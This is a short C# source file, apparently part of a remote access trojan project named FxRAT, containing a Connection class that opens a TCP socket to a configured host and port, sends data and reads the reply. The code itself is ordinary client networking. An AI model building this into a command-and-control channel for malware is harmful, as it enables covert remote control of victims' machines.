using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Lib;

namespace FxRAT.Utils
{
    public class Connection
    {
        private static Socket client;
        public bool isConnected;

        public void InitClient()
        {
            try
            {
                client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                client.Connect(new IPEndPoint(IPAddress.Parse(Settings.host), Settings.port));
                isConnected = true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }
        }

        public void WriteClient(string data)
        {
            // Send data to the server
            string message = data;
            byte[] dataToSend = Encoding.ASCII.GetBytes(message);
            client.Send(dataToSend);

            // Receive response from the server
            byte[] buffer = new byte[1024];
            int bytesRead = client.Receive(buffer);
            string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            Console.WriteLine($"Server response: {response}");
        }
    }
}